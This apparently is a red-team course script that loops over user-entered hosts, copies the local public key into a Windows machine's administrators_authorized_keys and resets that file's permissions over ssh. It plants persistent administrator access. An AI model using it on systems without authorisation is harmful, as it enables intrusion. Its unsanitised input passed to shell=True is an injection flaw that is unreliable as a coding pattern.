#!/usr/bin/env python3

"""
CDT-2221 Alpha Red Team
Author: Anthony Swierkosz; ajs2576

Installs SSH keys for Ansible to use.
"""

import subprocess

user = "Administrator"
ip = "10.1.4.7"

# Only if this file is run directly
if __name__ == '__main__':
    while True:
        user = input("Enter the username: ")
        ip = input("Enter the IP address: ")

        print(f"Installing SSH key for '{user}@{ip}'...")
        subprocess.run(
            ' '.join(['sudo', 'scp', '~/.ssh/id_rsa.pub', f'{user}@{ip}:/ProgramData/ssh/administrators_authorized_keys']),
            shell=True)

        print(f"Setting permissions for '{user}@{ip}'...")
        subprocess.run(' '.join(['sudo', 'ssh', f'{user}@{ip}',
                                 '\'icacls.exe "C:\ProgramData\ssh\\administrators_authorized_keys" /inheritance:r /grant "Administrators:F" /grant "SYSTEM:F"\'']),
                       shell=True)

        subprocess.run(' '.join(['sudo', 'ssh', f'{user}@{ip}',
                                 '\'icacls "C:\ProgramData\ssh\\administrators_authorized_keys" /remove "NT AUTHORITY\Authenticated Users"\'']),
                       shell=True)

        subprocess.run(' '.join(['sudo', 'ssh', f'{user}@{ip}',
                                 '\'icacls "C:\ProgramData\ssh\\administrators_authorized_keys" /inheritance:r\'']),
                       shell=True)
